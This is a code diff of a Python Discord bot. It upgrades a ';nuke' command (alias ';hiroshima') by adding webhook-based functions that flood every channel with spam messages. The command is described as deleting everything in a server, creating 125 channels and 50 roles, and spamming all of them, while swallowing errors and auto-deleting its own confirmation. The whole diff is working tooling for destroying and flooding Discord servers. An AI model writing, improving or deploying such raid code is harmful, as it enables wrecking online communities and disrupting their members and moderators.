@@ -103,11 +103,42 @@ async def before_invoke(ctx):
         raise commands.CheckFailure()
 
 # ============================================================
-#  MAXIMUM SPEED NUKE COMMAND - FOCUSED ON SPAMMING
+#  WEBHOOK SPAM FUNCTION
+# ============================================================
+async def webhook_spam(channel, count=20):
+    """Create webhook and spam messages through it."""
+    sent = 0
+    try:
+        webhook = await channel.create_webhook(name="spam")
+        for _ in range(count):
+            try:
+                await webhook.send(SPAM_MESSAGE)
+                sent += 1
+            except:
+                pass
+        await webhook.delete()
+    except:
+        pass
+    return sent
+
+async def webhook_spam_all(channels, per_channel=20):
+    """Spam all channels using webhooks."""
+    total = 0
+    tasks = []
+    for c in channels:
+        tasks.append(webhook_spam(c, per_channel))
+    results = await asyncio.gather(*tasks, return_exceptions=True)
+    for r in results:
+        if isinstance(r, int):
+            total += r
+    return total
+
+# ============================================================
+#  MAXIMUM SPEED NUKE COMMAND - WEBHOOK SPAM
 # ============================================================
 @client.command(name="nuke")
 async def nuke(ctx):
-    """Maximum speed nuke - deletes everything, creates 125 channels, spams heavily."""
+    """Maximum speed nuke - deletes everything, creates 125 channels, webhook spam."""
     if not ctx.guild:
         try:
             await ctx.send("Use this command in a server.", delete_after=5)
@@ -150,22 +181,11 @@ async def nuke(ctx):
     channels = [r for r in results if isinstance(r, discord.TextChannel)]
     print(f"[NUKE] Created {len(channels)} channels")
 
-    # Phase 3: HEAVY SPAM - 100 messages per channel as fast as possible
+    # Phase 3: WEBHOOK SPAM - 50 messages per channel via webhooks
     if channels:
-        print(f"[NUKE] Spamming {len(channels)} channels with 100 messages each...")
-        spam_tasks = []
-        for c in channels:
-            for _ in range(100):
-                spam_tasks.append(c.send(SPAM_MESSAGE))
-        
-        # Send all spam messages in parallel batches
-        batch_size = 500
-        for i in range(0, len(spam_tasks), batch_size):
-            batch = spam_tasks[i:i+batch_size]
-            await asyncio.gather(*batch, return_exceptions=True)
-            print(f"[NUKE] Sent batch {i//batch_size + 1}/{ (len(spam_tasks)//batch_size) + 1}")
-        
-        print(f"[NUKE] Spammed {len(channels)} channels with 100 messages each = {len(channels)*100} total messages")
+        print(f"[NUKE] Webhook spamming {len(channels)} channels with 50 messages each...")
+        total_sent = await webhook_spam_all(channels, per_channel=50)
+        print(f"[NUKE] Sent {total_sent} webhook messages")
 
     # Phase 4: Create 50 roles
     role_tasks = []
@@ -192,7 +212,7 @@ async def nuke(ctx):
         pass
 
     try:
-        await ctx.send(f"Nuke complete. {len(channels)} channels created. {len(channels)*100} messages sent.", delete_after=10)
+        await ctx.send(f"Nuke complete. {len(channels)} channels created. {total_sent if channels else 0} webhook messages sent.", delete_after=10)
     except:
         pass
 
@@ -918,7 +938,7 @@ async def help_command(ctx):
     )
     embed.add_field(
         name="Nuke",
-        value=";nuke - Maximum speed nuke (125 channels, heavy spam, 50 roles)\n"
+        value=";nuke - Maximum speed nuke (125 channels, webhook spam, 50 roles)\n"
               ";hiroshima - Alias for ;nuke",
         inline=False
     )
